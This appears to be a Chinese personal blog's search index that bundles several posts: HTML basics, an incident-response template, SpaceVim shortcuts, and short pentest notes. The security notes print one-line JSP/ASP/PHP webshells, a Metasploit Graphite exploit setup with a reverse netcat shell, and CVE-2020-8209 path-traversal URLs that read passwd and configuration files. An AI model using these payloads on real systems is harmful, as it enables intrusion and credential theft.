align=\u0026#34;\u0026#34; \u0026gt; \u0026lt;!--可选---\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;!--第三行---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tfoot\u0026gt; \u0026lt;/table\u0026gt;   表单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026lt;!--创建表单---\u0026gt; \u0026lt;form name=\u0026#34;form1\u0026#34; method=\u0026#34;GET/POST\u0026#34; action=\u0026#34;url\u0026#34; enctype=\u0026#34;Text/plain | multipart/form-data | application/x-www-form-urlencoded\u0026#34; target=\u0026#34;_self/_blank\u0026#34;\u0026gt; 控件: \u0026lt;input name=\u0026#34;控件名\u0026#34; type=\u0026#34;控件类型\u0026#34; \u0026gt; 文本框: \u0026lt;input name=\u0026#34;text1\u0026#34; type=\u0026#34;text\u0026#34; size=10 maxlength=200 value=\u0026#34;文本默认值\u0026#34; \u0026gt; 密码框: \u0026lt;input name=\u0026#34;password1\u0026#34; type=\u0026#34;password\u0026#34; size=10 maxlength=200 value=\u0026#34;文本默认值\u0026#34;\u0026gt; \u0026lt;br /\u0026gt; 单选按钮: \u0026lt;input name=\u0026#34;radio1\u0026#34; type=\u0026#34;radio\u0026#34; value=\u0026#34;单选按钮取值1\u0026#34; checked\u0026gt;选项1 单选按钮: \u0026lt;input name=\u0026#34;radio1\u0026#34; type=\u0026#34;radio\u0026#34; value=\u0026#34;单选按钮取值2\u0026#34; \u0026gt;选项2 \u0026lt;br /\u0026gt; 复选项: \u0026lt;input name=\u0026#34;checkbox1\u0026#34; type=\u0026#34;checkbox\u0026#34; value=\u0026#34;复选项的值\u0026#34; checked\u0026gt;项目1 复选项: \u0026lt;input name=\u0026#34;checkbox1\u0026#34; type=\u0026#34;checkbox\u0026#34; value=\u0026#34;复选项的值\u0026#34; \u0026gt;项目2 复选项: \u0026lt;input name=\u0026#34;checkbox1\u0026#34; type=\u0026#34;checkbox\u0026#34; value=\u0026#34;复选项的值\u0026#34; checked\u0026gt;项目3 \u0026lt;br /\u0026gt; 普通按钮: \u0026lt;input name=\u0026#34;button1\u0026#34; type=\u0026#34;button\u0026#34; value=\u0026#34;普通按钮显示值\u0026#34; onclick=\u0026#34;function\u0026#34;\u0026gt; \u0026lt;br /\u0026gt; 提交按钮: \u0026lt;input name=\u0026#34;submit1\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;提交按钮显示值\u0026#34; \u0026gt; 重置按钮: \u0026lt;input name=\u0026#34;reset1\u0026#34; type=\u0026#34;reset\u0026#34; value=\u0026#34;重置按钮显示值\u0026#34; \u0026gt; 图像提交按钮: \u0026lt;input name=\u0026#34;image1\u0026#34; type=\u0026#34;image\u0026#34; src=\u0026#34;path/to/image\u0026#34; value=\u0026#34;默认值\u0026#34; \u0026gt; 隐藏按钮: \u0026lt;input name=\u0026#34;hidden1\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#34;提交参数值\u0026#34;\u0026gt; 文件按钮: \u0026lt;input name=\u0026#34;file1\u0026#34; type=\u0026#34;file\u0026#34; \u0026gt; \u0026lt;!--菜单列表类型的控件---\u0026gt; \u0026lt;!--下拉菜单---\u0026gt; 证件类型: \u0026lt;select name=\u0026#34;cardtype\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;id_card\u0026#34; selected\u0026#34;\u0026gt;身份证 \u0026lt;option value=\u0026#34;stu_card\u0026#34; \u0026gt;学生证 \u0026lt;option value=\u0026#34;drive_card\u0026#34;\u0026gt;驾驶证 \u0026lt;option value=\u0026#34;other_card\u0026#34;\u0026gt;其他证件 \u0026lt;/select\u0026gt;\t\u0026lt;!--列表项菜单---\u0026gt; 对html评价: \u0026lt;select name=\u0026#34;content\u0026#34; size=5 multiple\u0026gt; \u0026lt;option value=\u0026#34;M1\u0026#34; selected\u0026gt;很容易 \u0026lt;option value=\u0026#34;M2\u0026#34; \u0026gt;一般 \u0026lt;option value=\u0026#34;M3\u0026#34; \u0026gt;能理解 \u0026lt;/select\u0026gt; \u0026lt;!--文本域----\u0026gt; 留言: \u0026lt;textarea name=\u0026#34;textarea1\u0026#34; rows=5 cols=80 \u0026gt;默认显示值\u0026lt;/textarea\u0026gt;\t\u0026lt;/form\u0026gt;   框架 框架基本结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u0026lt;!--水平分割窗口rows---\u0026gt; \u0026lt;frameset rows=\u0026#34;30%,70%\u0026#34; frameborder=0/1 \u0026gt; \u0026lt;frame src=\u0026#34;path/to/xx.html name=\u0026#34;xx\u0026#34; \u0026gt; \u0026lt;frame src=\u0026#34;path/to/file name=\u0026#34;file1\u0026#34; \u0026gt; \u0026lt;/frameset\u0026gt; \u0026lt;!--垂直分割窗口cols---\u0026gt; \u0026lt;frameset rows=\u0026#34;25%,55%，25%\u0026#34; frameborder=0/1 \u0026gt; \u0026lt;frame\u0026gt; \u0026lt;frame\u0026gt; \u0026lt;frame\u0026gt; \u0026lt;/frameset\u0026gt; ### 浮动框架 ```html \u0026lt;iframe name=\u0026#34;\u0026#34; align=\u0026#34;\u0026#34; width=12 height=12 src=\u0026#34;path/to/xx.html\u0026#34; \u0026gt; \u0026lt;iframe\u0026gt;   ","description":"","id":86,"section":"en","tags":null,"title":"html_basic","uri":"http://crkmythical.github.io/en/blog/html-basic/"},{"content":"编写进度\n   [toc]\n应急响应分类:\n  勒索病毒(Rasomware) 是伴随数字货币星期的一种新型病毒木马，\n机器一旦遭受勒索病毒攻击，将会使绝大多数文件被非对称加密算法和对称加密算法组合的方式进行篡改，并添加一个特殊后缀。\n绝大大叔勒索病毒均无法通过技术手段解密，必须拿到对应的解密私钥才有可能无损还原加密文件。\n常见的勒索病毒有WannaCry、GlobeImposter、Dharma等。\n  挖矿(Mining)木马 是一种利用被入侵计算机的算力挖掘加密数字货币以谋取利益的木马，   它会采用多种安全对抗技术(如修改任务计划、修改防火墙配置、修改系统动态链接库等)手段驻留在服务器中。\n常见的挖矿木马： WannaMine、Mykings、Bulehero等。\n 网站后门(Webshell)\nWebshell是一种带有文件操作、命令执行等功能的网页脚本,常见脚本如下： JSP:  1  \u0026lt;% Runtime.getRuntime().exe(request.getParameter(\u0026#34;cmd\u0026#34;)) %\u0026gt;    ASP:  1  \u0026lt;% eval request(\u0026#34;cmd\u0026#34;) %\u0026gt;    PHP:  1  \u0026lt;?php eval($_GET[“cmd\u0026#34;]);?\u0026gt;   事件预判 事件背景\nxxxx年x月x日，x公司内网服务器遭遇(挖矿木马、勒索病毒、网站被篡改)。\n应急响应工程师在抵达现场后，对包含服务器在的x台机器进行系统排查和日志分析。\n 发现服务器大量资源被占用，初步判断内网多台服务器均感染挖矿病毒。 确定内网多台服务器均感染xx勒索病毒，该公司多区，多台服务器重要数据均被加密。 确定服务器已被植入webshell后门。  中勒索病毒的特征  业务系统无法访问(50%) 桌面新txt文件(60%) 文件后缀被篡改(80%) 勒索信展示(100%)  中挖矿木马特征  服务器CPU使用率飙升，系统卡顿，部分服务无法正常运行等现象 根据安全监测设备的告警判断，挖矿木马会与矿池地址建立连接  确定挖矿开始时间\n  查看矿池地址\n挖矿木马会与矿池建立连接，通过安全监测类设备查看第一次连接矿池地址的时间，可作为初始时间\n  查看计划任务创建时间\n挖矿木马通常会创建计划任务，定期运行，可以查看计划任务的时间，但计划任务存在更新的情况，会刷新时间\n  挖矿木马文件创建时间\n可以判断挖矿木马运行的初始时间，但也存在被计划任务定时运行而更新木马文件创建的时间。\n  中webshell特征  网页被篡改（植入暗链、异常字段等） 安全设备告警  事件排查 勒索病毒排查思路 重点关注网络连接、进程、任务计划等信息，针对windows还需关注启动项和注册表\n若涉及溯源和证据固定，可提前对可疑对象做好备份，对涉及的可疑系统用户组可先进行禁用操作，防止出现可疑内容删除而无法溯源和提供证据的发生。\n挖矿木马排查思路 挖矿木马一般会创建恶意的进程连接矿池，利用系统内存、CPU、GPU资源进行挖矿，\n同时会通过创建用户、服务、任务计划、修改注册表、启动项、防火墙策略等手段来实现病毒的持久化。\n需重点关注用户、异常IP连接、进程、服务、任务计划\nWebshell排查思路 如果网站被植入暗链或单击出现意外跳转到其他网站，应首先排查网站首页的相关的js文件。\n  Webshell排查\n使用工具(D盾等)对网站目录进行扫描，定位webshell并清除。\n  Web日志分析\n对访问网站的Web日志进行分析，重点关注已知的入侵事件前后的日志记录。\n  系统排查\n防止获取webshell后进行后续提权等操作\n  网络流量排查\n  事件处理 勒索病毒 确认勒索病毒事件后，需及时对勒索病毒进行清理并进行相应的数据恢复工作，同时对服务器/主机进行安全加固，避免二次感染。\n 隔离问题主机，断开网络连接 在网络边界防洪墙上全局关闭3389端口，或3389端口只对特定IP地址开放 开启Windows防火墙，尽量关闭135、139、445、3389等不用的高危端口 每台机器设置唯一登陆密码，且应设置高强度的密码，位数在15位以上，包含大小写字母，数字，特殊字符。 安装最新杀毒软件，对被感染机器进行安全扫描和病毒查杀 对系统进行补丁更新，封堵病毒传播路径 结合备份的网站日志对网站应用进行全面代码审计，找出攻击者利用的漏洞入口，进行封堵 使用全流量设备对全网中存在的威胁进行分析，排查问题  挖矿木马  封堵矿池地址 结束异常进程 清理计划任务、禁用可疑用户 清除挖矿木马 全盘杀毒、加固  Webshell 事件总结 综上，对发现的线索进行梳理如下：\n xx xx xx xx xx\n综上分析，\n此次内网服务器所感染的病毒为XX挖矿蠕虫病毒。   通过收集病毒感染的服务器日志信息，发现最早感染的主机为堡垒机应用服务器，感染时间为Y/m/d H:M:S. 通过收集分析堡垒机应用服务器所有日志信息，排除人为投毒的可能性。 通过阅读解密后的脚本内容发现，该脚本\u0026lt;脚本运行的逻辑描述，通过分析该下载文件，可判断该文件为挖矿木马的母体。  IP地址为x.x.x.x的主机最先远程登录到IP地址x.x.x.x的主机，先进行一系列扫描及内部RDP暴力破解等操作，并通过x.x.x.x的主机进行横向移动，寻找有价值的服务器进行人工投毒，植入类似病毒进行攻击。\n后续防范  服务器、终端防护  所有服务器、终端应强行实施复杂密码策略，杜绝弱口令 杜绝使用通用密码管理所有机器 安装杀毒软件、终端安全管理软件，并及时更新病毒库 及时安装漏洞补丁 服务器开启关键日志收集功能，为安全事件的溯源提供支持   网络防护与安全监测  对内网的安全域进行合理划分，各个安全域之间严格限制访问控制列表(ACL),限制横向移动的范围 配置并开启相关关键系统、应用日志，对系统日志进行定期异地归档、备份。 重要业务系统及核心数据库应设置独立的安全区域，并做好区域边界的安全防御工作，严格限制重要区域的访问权限，并关闭Telnet、SNMP等不必要、不安全的服务 在网络内架设IDS/IPS设备，及时发现、阻断内网的横向移动行为 在网络内架设全流量记录设备，以发现内网的横向移动行为，并为溯源提供支持   应用系统防护及数据备份  需要对应用系统进行安全渗透测试与加固，保障应用系统自身安全可控 对业务系统及数据进行及时备份，并定期验证备份系统及备份数据的可用性 建立安全灾备预案，一旦核心系统遭受攻击，需要确保备份业务系统可以立即启用，同时做好备份系统与主系统的安全隔离工作，避免主、备系统同时被攻击，影响业务连续性    ","description":"","id":87,"section":"en","tags":null,"title":"应急响应模板","uri":"http://crkmythical.github.io/en/blog/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E6%9D%BF/"},{"content":"编写进度\n   Graphite 是一个企业级开源系统的实时监控绘图工具,采用Django框架编写，可实时收集、存储、显示时间序列类型的数据。\ninformation nmap -T4 -sV -Pn -p 5000 10.199.56.1 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-17 17:14 CST Nmap scan report for 10.199.56.1 Host is up (0.088s latency). PORT STATE SERVICE VERSION 5000/tcp open upnp? 1 service unrecognized despite returning data. MSF相关利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  Module options (exploit/unix/webapp/graphite_pickle_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.199.56.1 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The path to a vulnerable application VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 12.12.3.190 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port   ","description":"","id":88,"section":"en","tags":null,"title":"Graphite","uri":"http://crkmythical.github.io/en/blog/graphite/"},{"content":"编写进度\n  XenMobile MDM是一种可靠的移动设备管理解决方案，可以对企业设备和员工个人设备进行基于角色的管理和配置并确保安全性。完成用户设备注册后，IT部门可以自动为设备置备策略和应用，将应用列入黑名单或白名单，检测并防止使用越狱设备，擦除或有选择性地擦除丢失、被盗或不符合规定的设备中的数据。用户可以使用自己喜爱的任何设备，而IT部门可以确保企业资产的合规性，并有效保护设备中保存的企业内容。\n  XenMobile目录穿越 CVE-2020-8209 CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件。\n通过空间引擎关键字\n\u0026ldquo;XenMobile控制台\u0026rdquo; 或者 \u0026ldquo;XenMobile - Console\u0026rdquo;\nPOC CVE-2020-8209\n1 2 3  /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd /jsp/help-sb-download.jsp?sbFileName=../../../opt/sas/sw/config/sftu.properties   漏洞建议 官方补丁删除了/opt/sas/sw/tomcat/inst1/webapps/ROOT/jsp/help-sb-download.jsp\n","description":"","id":89,"section":"en","tags":null,"title":"XenMobile","uri":"http://crkmythical.github.io/en/blog/xenmobile/"},{"content":"编写进度\n   Vim Cheat Sheet\n## SpaceVim\n官方文档实在太难阅读了\n帮助信息\nSPC h k 显示各个导航快捷键的绑定信息\n   快捷键 功能描述     SPC h k 使用快捷键导航，展示 SpaceVim 所支持的前缀键   SPC h m 使用 Unite 浏览所有 man 文档    报告一个问题：\n   快捷键 功能描述     SPC h I 根据模板展示 Issue 所必须的信息    导航键 Spacevim中的前缀键：    前缀名称 用户选项以及默认值 功能描述     [SPC] 空格键 SpaceVim 默认前缀键   [Window] s SpaceVim 默认窗口前缀键   \u0026lt;leader\u0026gt; \\ Vim/Neovim 默认前缀键   g g unkown   z z unkown    SPC前缀键大体命令分类    SPC主体划分 相关功能     SPC b 缓冲区相关命令   SPC c 注释相关命令   SPC e 错误相关命令   SPC f 文件操作相关命令   SPC h 帮助相关命令   SPC i 插入相关命令   SPC j 跳转、合并、拆分相关命令   SPC l 编程相关命令   SPC q 退出vim相关命令   SPC s 搜索相关命令   SPC w 窗口相关命令   SPC x 文本相关命令    导航窗口内，按下 Ctrl-h 键,可显示帮助信息 帮助信息快捷键：\n   按键 功能描述     u 撤销按键   n 向下翻页   p 向上翻页    如果要自定义以 [SPC] 为前缀的快捷键，可以使用 SpaceVim#custom#SPC()，示例如下：\n启动函数文件应放置在 Vim \u0026amp;runtimepath 的 autoload 文件夹内。例如：\n文件名：~/.SpaceVim.d/autoload/myspacevim.vim\ncall SpaceVim#custom#SPC('nnoremap', ['f', 't'], 'echom \u0026quot;hello world\u0026quot;', 'test custom SPC', 1) 自定义配置 SpaceVim 相关的快捷键均以 SPC f v 为前缀，这便于快速访问 SpaceVim 的配置文件：\n   快捷键 功能描述     SPC f v v 复制并显示当前 SpaceVim 的版本   SPC f v d 打开 SpaceVim 的用户配置文件   SPC h l 列出所有可用模块    全部模块\n1 2 3 4 5 6 7 8 9 10 11  [options] automatic_update = true # SpaceVim自动更新 disabled_plugins = [\u0026#34;clighter\u0026#34;, \u0026#34;clighter8\u0026#34;] # 禁用插件 [[custom_plugins]] # 自定义插件 repo = \u0026#34;lilydjwg/colorizer\u0026#34; on_cmd = [\u0026#34;ColorHighlight\u0026#34;, \u0026#34;ColorToggle\u0026#34;] # 可以通过 :h dein-options 查阅。 merged = false   界面美化 所有的界面元素切换快捷键都以 [SPC] t 或 [SPC] T 开头\n1 2 3 4 5 6 7 8  [options] colorscheme = \u0026#34;gruvbox\u0026#34; colorscheme_bg = \u0026#34;dark\u0026#34; filemanager = \u0026#34;nerdtree\u0026#34; enable_googlesuggest = true # 启用google搜索 enable_guicolors = false # 启用真色 guifont = \u0026#34;SourceCodePro Nerd Font Mono:h11\u0026#34; # 字体配置   界面元素切换    快捷键 功能描述     SPC t 8 高亮所有超过 80 列的字符   SPC t f 高亮临界列，默认 max_column 是第 120 列   SPC t h h 高亮当前行   SPC t h i 高亮代码对齐线   SPC t h c 高亮光标所在列   SPC t h s 启用/禁用语法高亮   SPC t i 切换显示当前对齐(TODO)   SPC t n 显示/隐藏行号   SPC t b 切换背景色   SPC t c 切换 conceal 模式   SPC t p 切换 paste 模式   SPC t t 打开 Tab 管理器   SPC T ~ 显示/隐藏 Buffer 结尾空行行首的 ~   SPC T F 切换全屏(TODO)   SPC T f 显示/隐藏 Vim 边框(GUI)   SPC T m 显示/隐藏菜单栏   SPC T t 显示/隐藏工具栏    状态栏 1  statusline_separator = \u0026#39;arrow\u0026#39;   状态栏中功能模块内的字符显示与否，快捷键\n   快捷键 Unicode ASCII 功能     SPC t 8 ⑧ 8 高亮指定列后所有字符   SPC t f ⓕ f 高亮指定列字符   SPC t s ⓢ s 语法检查   SPC t S Ⓢ S 拼写检查   SPC t w ⓦ w 行尾空格检查    其他快捷键\n   快捷键 功能描述     SPC t m b 显示/隐藏电池状态 (需要安装 acpi)   SPC t m c toggle the org task clock (available in org layer)(TODO)   SPC t m i 显示/隐藏输入法   SPC t m m 显示/隐藏 SpaceVim 已启用功能   SPC t m M 显示/隐藏文件类型   SPC t m n toggle the cat! (if colors layer is declared in your dotfile)(TODO)   SPC t m p 显示/隐藏光标位置信息   SPC t m t 显示/隐藏时间   SPC t m d 显示/隐藏日期   SPC t m T 显示/隐藏状态栏   SPC t m v 显示/隐藏版本控制信息    模糊搜索 Denite搜索快捷键    快捷键 功能描述     \u0026lt;Leader\u0026gt; f \u0026lt;Space\u0026gt; 模糊查找快捷键，并执行该快捷键   \u0026lt;Leader\u0026gt; f e 模糊搜索寄存器   \u0026lt;Leader\u0026gt; f h 模糊搜索 history/yank   \u0026lt;Leader\u0026gt; f j 模糊搜索 jump, change   \u0026lt;Leader\u0026gt; f l 模糊搜索 location list   \u0026lt;Leader\u0026gt; f m 模糊搜索 output messages   \u0026lt;Leader\u0026gt; f o 模糊搜索函数列表   \u0026lt;Leader\u0026gt; f q 模糊搜索 quickfix list   \u0026lt;Leader\u0026gt; f r 重置上次搜索窗口    Denite模糊搜索窗口内的快捷键    快捷键 功能描述     \u0026lt;Tab\u0026gt; / Ctrl-j 下一个选项   Shift-\u0026lt;Tab\u0026gt; / Ctrl-k 上一个选项   jk 离开输入模式（仅支持 denite 和 unite 模块）   Ctrl-w 删除光标前词语   \u0026lt;Enter\u0026gt; 执行默认动作   Ctrl-s 在分割窗口内打开   Ctrl-v 在垂直分割窗口内打开   Ctrl-t 在新的标签页里打开   Ctrl-g 推出模糊搜索插件    Denite模块可视模式下快捷键    快捷键 功能描述     Ctrl+h/k/l/r 未定义   Ctrl+l 刷新窗口   \u0026lt;Tab\u0026gt; 选择即将执行的动作   Space 切换标记当前选项   r 替换或者重命名   Ctrl+z 切换窗口分割方式    实时代码检索    快捷键 功能描述     SPC s / 在工程中使用默认工具实时检索代码    Flygrep 搜索窗口结果窗口内的常用快捷键：    快捷键 功能描述     \u0026lt;Esc\u0026gt; 关闭搜索窗口   \u0026lt;Enter\u0026gt; 打开当前选中的文件位置   Ctrl-t 在新标签栏打开选中项   Ctrl-s 在分屏打开选中项   Ctrl-v 在垂直分屏打开选中项   Ctrl-q 将搜索结果转移至 quickfix   \u0026lt;Tab\u0026gt; 选中下一行文件位置   Shift-\u0026lt;Tab\u0026gt; 选中上一行文件位置   \u0026lt;Backspace\u0026gt; 删除上一个输入字符   Ctrl-w 删除光标前的单词   Ctrl-u 删除光标所在行的内容   Ctrl-k 删除光标后所有内容   Ctrl-a / \u0026lt;Home\u0026gt; 将光标移至行首   Ctrl-e / \u0026lt;End\u0026gt; 将光标移至行尾    基本操作 光标及滚屏操作    快捷键 功能描述     h 向左移动光标   j 向下移动光标   k 向上移动光标   l 向右移动光标   \u0026lt;Up\u0026gt; 向上移动光标，不跳过折行   \u0026lt;Down\u0026gt; 向下移动光标，不跳过折行   H 移动光标至屏幕顶部   M 移动光标至屏幕中部   L 移动光标至屏幕底部   } 向前移动一个段落   { 向后移动一个段落   Ctrl-f 向下翻页 (Ctrl-f / Ctrl-d)   Ctrl-b 向上翻页 (C-b / C-u)   Ctrl-e 向下滚屏 (3 Ctrl-e/j)   Ctrl-y 向上滚屏 (3Ctrl-y/k)   Ctrl-Shift-Up 向上移动当前行   Ctrl-Shift-Down 向下移动当前行    命令行Ex模式 常规模式下按下: 键后，可进入命令行Ex模式，\n   快捷键 功能描述     Ctrl-a 移动光标至行首   Ctrl-b 向左移动光标   Ctrl-f 向右移动光标   Ctrl-w 删除光标前词   Ctrl-u 移除光标前所有字符   Ctrl-k 移除光标后所有字符   Ctrl-c/Esc 离开命令行模式   Tab 选择下一个匹配   Shift-Tab 选择上一个匹配    快速定位操作 easy-motion快捷键 \u0026lt;Leader\u0026gt; \\\n   快捷键 功能描述     \u0026lt;Leader\u0026gt;f{char} Find {char} to the right. See f.   \u0026lt;Leader\u0026gt;F{char} Find {char} to the left. See F.   \u0026lt;Leader\u0026gt;t{char} Till before the {char} to the right. See t.   \u0026lt;Leader\u0026gt;T{char} Till after the {char} to the left. See T.   \u0026lt;Leader\u0026gt;w Beginning of word forward. See w.   \u0026lt;Leader\u0026gt;W Beginning of WORD forward. See W.   \u0026lt;Leader\u0026gt;b Beginning of word backward. See b.   \u0026lt;Leader\u0026gt;B Beginning of WORD backward. See B.   \u0026lt;Leader\u0026gt;e End of word forward. See e.   \u0026lt;Leader\u0026gt;E End of WORD forward. See E.   \u0026lt;Leader\u0026gt;ge End of word backward. See ge.   \u0026lt;Leader\u0026gt;gE End of WORD backward. See gE.   \u0026lt;Leader\u0026gt;j Line downward. See j.   \u0026lt;Leader\u0026gt;k Line upward. See k.   \u0026lt;Leader\u0026gt;n Jump to latest “/” or “?” forward. See n.   \u0026lt;Leader\u0026gt;N Jump to latest “/” or “?” backward. See N.   \u0026lt;Leader\u0026gt;s Find(Search) {char} forward and backward.    对齐操作    快捷键 功能描述     SPC x a # 基于分隔符 # 进行文本对齐   SPC x t c 交换当前字符和前一个字符的位置   SPC x t C 交换当前字符和后一个字符的位置   SPC x t w 交换当前单词和前一个单词的位置   SPC x t W 交换当前单词和后一个单词的位置   SPC x t l 交换当前行和前一行的位置   SPC x t L 交换当前行和后一行的位置   SPC x u 将选中字符串转为小写   SPC x U 将选中字符串转为大写   SPC x w c 统计选中区域的单词数   SPC x w d show dictionary entry of word from wordnik.com (TODO)   SPC x \u0026lt;Tab\u0026gt; indent or dedent a region rigidly (TODO)    复制/粘贴    快捷键 功能描述     \u0026lt;Leader\u0026gt; p 粘贴系统剪切板文字至当前位置之后   \u0026lt;Leader\u0026gt; P 粘贴系统剪切板文字至当前位置之前    跳转    快捷键 功能描述     SPC j d 跳至当前目录某个文件夹   SPC j D 跳至当前目录某个文件夹（在另外窗口展示文件列表）   SPC j i 跳至当前文件的某个函数，使用 Denite 打开语法树   SPC j u 跳至窗口某个 URL   SPC j v 跳至某个 Vim 函数的定义处   SPC j w 跳至 Buffer 中某个单词 (easymotion)    其他操作 以g为前缀的快捷键    快捷键 功能描述     g ' 跳至标签   g a 打印光标字符的 ascii 值   g d 跳至定义处    以z为前缀的快捷键    快捷键 功能描述     z = spelling suggestions   z A toggle folds recursively   z C close folds recursively   z D delete folds recursively   z E eliminate all folds   z a toggle a fold   z b redraw, cursor line at bottom   z c close a fold   z d delete a fold   z e right scroll horizontally to cursor position   z f create a fold for motion   z g mark good spelled   z h scroll screen N characters to right   z i toggle foldenable   z j mode to start of next fold   z k mode to end of previous fold   z l scroll screen N characters to left   z m subtract one from foldlevel   z n reset foldenable   z o open fold    移动代码块    快捷键 功能描述     \u0026lt; / Shift-Tab 向左移动文本   \u0026gt; / Tab 向右移动文本   Ctrl-Shift-Up 向上移动选中行   Ctrl-Shift-Down 向下移动选中行    代码缩进 1 2 3  [options] default_indent = 2 expand_tab = true   增减数字    快捷键 功能描述     SPC n + 为光标下的数字加 1 并进入 临时快捷键状态   SPC n - 为光标下的数字减 1 并进入 临时快捷键状态    10 SPC n + 将为光标下的数字加 10\n增删注释    快捷键 功能描述     SPC ; 进入注释操作模式   SPC c l 注释/反注释当前行   SPC c u 反注释行   SPC c p 注释/反注释段落   SPC c t 注释/反注释到行    SPC ; 4 j，这个组合键会注释当前行以及下方的 4 行。这个数字即为相对行号\n编辑历史记录 快捷键 F7 查看，默认会在左侧打开一个编辑历史可视化窗口\n在编辑历史窗口内的快捷键如下：\n   快捷键 功能描述     ? toggle_help   G move_bottom   J move_older_write   K move_newer_write   P play_to   / search   \u0026lt;CR\u0026gt; preview   d diff   i toggle_inline   j move_older   k move_newer   n next_match   o preview   q quit   r diff   gg move_top    窗口window管理 窗口管理快捷键有一个统一的前缀，默认的前缀 [Window] 是按键 s\n1 2  [options] windows_leader = \u0026#34;s\u0026#34;   常见编辑器窗口\n   按键 功能描述     \u0026lt;F1\u0026gt; 打开VIM帮助文档   \u0026lt;F2\u0026gt; 打开、关闭语法树/toc   \u0026lt;F3\u0026gt; 打开、关闭文件树   \u0026lt;F7\u0026gt; 打开、关闭历史编辑窗口   Ctrl-\u0026lt;Down\u0026gt; 切换至下方窗口   Ctrl-\u0026lt;Up\u0026gt; 切换至上方窗口   Ctrl-\u0026lt;Left\u0026gt; 切换至左边窗口   Ctrl-\u0026lt;Right\u0026gt; 切换至右边窗口    窗口跳转    快捷键 功能描述     SPC 1～9 跳至窗口 1～9    窗口分屏操作    快捷键 功能描述     q 智能关闭当前窗口   [Window] v 水平分屏   [Window] V 水平分屏，并编辑上一个文件   [Window] g 垂直分屏   [Window] G 垂直分屏，并编辑上一个文件   [Window] t 新建新的标签页   [Window] o 关闭其他窗口   [Window] x 关闭当前缓冲区，并保留新的空白缓冲区   [Window] q 关闭当前缓冲区   [Window] Q 关闭当前窗口   Shift-\u0026lt;Tab\u0026gt; 切换至前一窗口    常规模式下的按键 q 被用来快速关闭窗口，其原生的功能可以使用 \u0026lt;Leader\u0026gt; q r 来代替。\n窗口其他操作    快捷键 功能描述     SPC w . 启用窗口临时快捷键   SPC w \u0026lt;Tab\u0026gt; 在同一标签内进行窗口切换   SPC w = 对齐分离的窗口   SPC w c 进入阅读模式，浏览当前窗口 (需要 tools 模块)   SPC w C 选择某一个窗口，并且进入阅读模式 (需要 tools 模块)   SPC w d 删除一个窗口   SPC w D 选择一个窗口并关闭   SPC w F 新建一个新的标签页   SPC w h 移至左边窗口   SPC w H 将窗口向左移动   SPC w j 移至下方窗口   SPC w J 将窗口向下移动   SPC w k 移至上方窗口   SPC w K 将窗口向上移动   SPC w l 移至右方窗口   SPC w L 将窗口向右移动   SPC w m 最大化/最小化窗口（最大化相当于关闭其它窗口）   SPC w M 选择窗口进行替换   SPC w o 按序切换标签页   SPC w p m 使用弹窗打开消息   SPC w p p 关闭当前弹窗窗口   SPC w r 顺序切换窗口   SPC w R 逆序切换窗口   SPC w s/- 水平分割窗口   SPC w S 水平分割窗口，并切换至新窗口   SPC w u 恢复窗口布局   SPC w U 撤销恢复窗口布局   SPC w v// 垂直分离窗口   SPC w V 垂直分离窗口，并切换至新窗口   SPC w w 切换至前一窗口   SPC w W 选择一个窗口   SPC w x 切换窗口文件    标签tab管理 标签管理器 可使用 SPC t t 打开内置的标签管理器，标签管理器内的快捷键如下：\n   快捷键 功能描述     o 展开或关闭标签目录   r 重命名光标下的标签页   n 在光标位置下新建命名标签页   N 在光标位置下新建匿名标签页   x 删除光标下的标签页   Ctrl-S-\u0026lt;Up\u0026gt; 向上移动光标下的标签页   Ctrl-S-\u0026lt;Down\u0026gt; 向下移动光标下的标签页   \u0026lt;Enter\u0026gt; 跳至光标所对应的标签窗口    标签跳转    快捷键 功能描述     \u0026lt;Leader\u0026gt; 1~0 跳至标签栏序号 1~10   \u0026lt;Leader\u0026gt; \u0026lt;Shift\u0026gt; 1~9 跳至标签栏序号 11~20   \u0026lt;Mouse-left\u0026gt; 切换至该标签   \u0026lt;Mouse-middle\u0026gt; 删除该标签    缓冲区Buffer管理    快捷键 功能描述     SPC b . 启用缓冲区临时快捷键   SPC b b 通过模糊搜索工具进行缓冲区切换，需要启用一个模糊搜索工具模块   SPC b h 打开欢迎界面, 等同于快捷键 SPC a s   SPC b m 打开消息缓冲区    缓冲区（Buffer）操作相关快捷键都是以 SPC b 为前缀的\n新建空白buffer    快捷键 功能描述     SPC b N h 在左侧新建一个窗口，并在其中新建空白 buffer   SPC b N j 在下方新建一个窗口，并在其中新建空白 buffer   SPC b N k 在上方新建一个窗口，并在其中新建空白 buffer   SPC b N l 在右侧新建一个窗口，并在其中新建空白 buffer   SPC b N n 在当前窗口新建一个空白 buffer    切换buffer    快捷键 功能描述     SPC \u0026lt;Tab\u0026gt; 切换至前一缓冲区，常用于两个缓冲区来回切换   SPC b n 切换至下一个缓冲区，排除特殊插件的缓冲区   SPC b p 切换至前一个缓冲区，排除特殊插件的缓冲区   SPC b P 使用系统剪切板内容替换当前缓冲区   SPC b R 从磁盘重新读取当前缓冲区所对应的文件   SPC b s switch to the scratch 